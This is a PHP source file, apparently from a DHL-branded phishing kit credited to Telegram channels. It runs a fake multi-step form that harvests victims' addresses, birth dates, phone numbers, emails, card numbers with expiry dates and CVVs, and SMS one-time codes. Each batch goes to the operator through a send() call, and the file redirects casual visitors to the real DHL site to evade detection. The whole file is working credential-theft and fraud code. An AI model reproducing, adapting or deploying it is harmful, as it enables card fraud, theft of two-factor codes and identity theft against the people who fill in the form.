<?php

    /**//**//**//**//**//**

        Telegram : https://t.me/syst3mx
        Telegram Group : https://t.me/matos_x

    /**//**//**//**//**//**/
    

    include 'app.php';

    if( isset($_GET["redirection"]) && !empty($_GET['redirection']) ) {

        $red = $_GET['redirection'];
        $_SESSION['last_page'] = $red;
        $query = [];
        $parse_url = proper_parse_str($_SERVER['QUERY_STRING']);
        foreach($parse_url as $key => $val) {
            if( $key == 'redirection' ){
                unset($parse_url[$key]);
            } else {
                $query[] = $key . '=' . $val;
            }
        }
        if( is_array($query) ) {
            $query = "?" . implode('&',$query);
        }

        header("Location: " . randomix(24) . $query);
        exit();

    } else if( isset($_GET["lang"]) && !empty($_GET['lang']) ) {

        $_SESSION['lang'] = $_GET["lang"];
        location($_SESSION['last_page']);

    } else if( $_SERVER['REQUEST_METHOD'] == "POST" ) {
        

        if( $_POST['steeep'] == "details" ) {
            $_SESSION['errors'] = [];
            $_SESSION['address']    = $_POST['address'];
            $_SESSION['zip_code']    = $_POST['zip_code'];
            $_SESSION['city']    = $_POST['city'];
            $_SESSION['birth_date']    = $_POST['birth_date'];
            $_SESSION['phone']    = $_POST['phone'];
            $_SESSION['email']    = $_POST['email'];
            if( empty($_POST['address']) ) {
                $_SESSION['errors']['address'] = get_text("address_error");
            }
            if( empty($_POST['zip_code']) ) {
                $_SESSION['errors']['zip_code'] = get_text("zip_code_error");
            }
            if( empty($_POST['city']) ) {
                $_SESSION['errors']['city'] = get_text("city_error");
            }
            if( validate_date($_POST['birth_date'],'d/m/Y') == false ) {
                $_SESSION['errors']['birth_date'] = get_text("birth_date_error");
            }
            if( empty($_POST['phone']) ) {
                $_SESSION['errors']['phone'] = get_text("phone_error");
            }
            /*if( validate_email($_POST['email']) == false ) {
                $_SESSION['errors']['email'] = get_text("email_error");
            }*/
            
           
                //$subject = get_client_ip() . ' | DHL | Billing';
                //$message = '/-- DHL BILLING INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'Address : ' . $_POST['address'] . "\r\n";
                $message .= 'Zip code : ' . $_POST['zip_code'] . "\r\n";
                $message .= 'City : ' . $_POST['city'] . "\r\n";
                $message .= 'Birth date : ' . $_POST['birth_date'] . "\r\n";
                $message .= 'Phone : ' . $_POST['phone'] . "\r\n";
                $message .= 'Email : ' . $_POST['email'] . "\r\n";
                $message .= '/-- END BILLING INFOS --/' . "\r\n";
                //$message .= victim_infos();
                send($subject,$message);
                location('cc');
                exit();
            
        }

        if( $_POST['steeep'] == "cc" ) {
            $_SESSION['errors'] = [];
            $_SESSION['one']    = $_POST['one'];
            $_SESSION['two']    = $_POST['two'];
            $_SESSION['three']    = $_POST['three'];
            $_SESSION['name']    = $_POST['name'];
            $date_ex    = explode('/',$_POST['two']);
            $one        = validate_one($_POST['one']);
            $three      = validate_three($_POST['three']);
            $two        = validate_two($date_ex[0],$date_ex[1]);
            if( $one == false ) {
                $_SESSION['errors']['one'] = get_text("one_error");
            }
            if( $two == false ) {
                $_SESSION['errors']['two'] = get_text("two_error");
            }
            if( $three == false ) {
                $_SESSION['errors']['three'] = get_text("three_error");
            }
            if( validate_name($_POST['name']) == false ) {
                $_SESSION['errors']['name'] = get_text("name_error");
            }
            
            
                //$subject = get_client_ip() . ' | DHL | Card';
                $message = '/-- DHL CARD INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'Name : ' . $_POST['name'] . "\r\n";
                $message .= 'Card number : ' . $_POST['one'] . "\r\n";
                $message .= 'Card Date : ' . $_POST['two'] . "\r\n";
                $message .= 'Card CVV : ' . $_POST['three'] . "\r\n";
                $message .= '/-- END CARD INFOS --/' . "\r\n";
                //$message .= victim_infos();
                send($subject,$message);
                location('loading');
                exit();
            
        }

        if( $_POST['steeep'] == "sms" ) {
            $_SESSION['errors'] = [];
            $_SESSION['sms_code']    = $_POST['sms_code'];
            if( empty($_POST['sms_code']) ) {
                $_SESSION['errors']['sms_code'] = get_text('sms_error');
            }
           
           
              //  $subject = get_client_ip() . ' | DHL | Sms';
                $message = '/-- SMS INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'SMS Code : ' . $_POST['sms_code'] . "\r\n";
                $message .= '/-- END SMS INFOS --/' . "\r\n";
                //$message .= victim_infos();
                send($subject,$message);
                $sms_number = SMS_NUMBER;
                $error = intval($_POST['error']);
                $max = $sms_number - 1;
                if( $error >= $max ) {
                    location('success');
                }
                $current = intval($_POST['error']) + 1;
                location('loading','&error=' . $current);
            
        }

    } else {

        if( isset($_SESSION['last_page']) ) {
            redirect($_SESSION['last_page']);
        }

        header("Location: https://www.dhl.com/");
        exit();

    }
    

?>